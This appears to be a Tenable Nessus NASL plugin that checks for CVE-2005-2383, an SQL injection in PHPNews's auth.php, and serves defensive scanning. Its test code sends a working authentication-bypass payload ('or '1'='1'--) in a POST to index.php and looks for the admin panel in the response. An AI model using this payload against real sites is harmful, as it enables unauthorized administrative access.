#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19287);
  script_version("1.25");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-2383");
  script_bugtraq_id(14333);

  script_name(english:"PHPNews auth.php Multiple Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PHPNews, an open source news application
written in PHP. 

The installed version of PHPNews is prone to a SQL injection attack
because of its failure to sanitize user-supplied input via the
'user' and 'password' parameters of the 'auth.php' script.  Provided
PHP's 'magic_quotes_gpc' setting is disabled, an attacker can exploit
this flaw to manipulate SQL queries, and/or even to gain administrative
access.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2005/Jul/328");
  script_set_attribute(attribute:"see_also", value:"http://newsphp.sourceforge.net/changelog/changelog_1.30.txt");
  script_set_attribute(attribute:"solution", value:
"Upgrade to PHPNews version 1.3.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/07/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/07/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpnews:phpnews");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0, php: 1);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpnews", "/news", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Check whether index.php exists.
  #
  # nb: index.php require()'s auth.php, in which the flaw lies, so we
  #     can test either. The advantage of using index.php, though,
  #     is that if the exploit is successful, we should see some
  #     following text from the admin panel rather than nothing, as
  #     would be the case if we used auth.php.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it does and looks like PHPNews...
  if ('<link href="phpnews_package.css"' >< res) {
    # Try to exploit the flaw to bypass authentication.
    postdata = string(
      "user=", urlencode(str:"user=nessus' or '1'='1'--"), "&",
      "password=", SCRIPT_NAME
    );
    r = http_send_recv3(method:"POST", item: dir+"/index.php", version: 11, port: port,
      exit_on_fail: 1, content_type: "application/x-www-form-urlencoded",
      data: postdata );
    res = r[2];

    # There's a problem if we see the admin page.
    if ('<a href="index.php?action=logout">' >< res) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
